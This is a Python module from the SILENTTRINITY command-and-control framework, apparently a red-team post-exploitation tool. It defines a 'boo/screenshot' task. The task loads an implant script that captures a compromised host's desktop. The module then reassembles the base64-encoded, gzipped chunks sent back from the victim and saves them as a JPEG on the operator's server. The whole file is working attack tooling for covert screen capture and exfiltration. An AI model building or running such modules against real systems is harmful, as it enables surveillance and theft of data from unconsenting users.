import gzip
import logging
import json
import os
from base64 import b64decode
from silenttrinity.core.utils import get_path_in_package, get_path_in_data_folder
from silenttrinity.core.teamserver.module import Module


class STModule(Module):
    def __init__(self):
        self.name = 'boo/screenshot'
        self.language = 'boo'
        self.description = 'Takes a screenshot of the current desktop'
        self.author = '@daddycocoaman'
        self.references = []
        self.options = {}

    def payload(self):
        with open(get_path_in_package('core/teamserver/modules/boo/src/screenshot.boo'), 'r') as module_src:
            src = module_src.read()
            return src

    def process(self, context, output):
        try:
            filename = output['filename']
            self.gzip_file = os.path.join(
                get_path_in_data_folder("logs"),
                f"{context.session.guid}/screenshot_{filename}.gz"
            )
            self.decompressed_file = os.path.join(
                get_path_in_data_folder("logs"),
                f"{context.session.guid}/screenshot_{filename}.jpg"
            )

            file_chunk = output['data']
            with open(self.gzip_file, 'ab+') as reassembled_gzip_data:
                reassembled_gzip_data.write(b64decode(file_chunk))

            if output['current_chunk_n'] == (output['chunk_n'] + 1):
                try:
                    with open(self.decompressed_file, 'wb') as reassembled_file:
                        with gzip.open(self.gzip_file) as compressed_screenie:
                            reassembled_file.write(compressed_screenie.read())
                except Exception as e:
                    logging.error(f"Error decompressing re-assembled screenshot: {e}")
                return f"Saved screenshot to {self.decompressed_file}!"
            else:
                return f"Processed chunk {output['current_chunk_n']}/{output['chunk_n'] + 1}"
        except TypeError:
            return output
